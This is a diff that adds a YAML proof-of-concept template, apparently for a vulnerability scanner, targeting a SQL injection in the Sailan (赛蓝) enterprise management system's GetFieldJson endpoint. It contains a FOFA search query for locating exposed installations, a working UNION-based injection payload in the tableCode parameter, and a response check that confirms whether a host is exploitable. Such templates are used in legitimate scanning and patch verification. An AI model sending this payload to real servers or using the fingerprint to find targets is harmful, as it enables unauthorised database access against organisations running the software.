@@ -1,0 +1,15 @@
+id: poc-yaml-enterprise-management-system-getfieldjson-sqli
+info:
+  name: 赛蓝企业管理系统 GetFieldJson SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业管理系统
+  fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+requests:
+- method: GET
+  path: /BaseModule/ExcelImport/GetFieldJson?tableCode=1%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%28113%29%2BCHAR%2881%29%2BCHAR%28119%29%2BCHAR%2888%29%2BCHAR%2899%29%2BCHAR%2865%29%2BCHAR%28108%29%2BCHAR%28115%29%2BCHAR%2881%29%2BCHAR%2886%29%2BCHAR%2884%29%2CNULL--+cqNB
+  expression: "status_code == 200 && \ncontains(body,\"qpzkqQwXcAlsQVT\") &&\ncontains(body,\"\
+    \\\"id\\\":\\\"\\\"\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
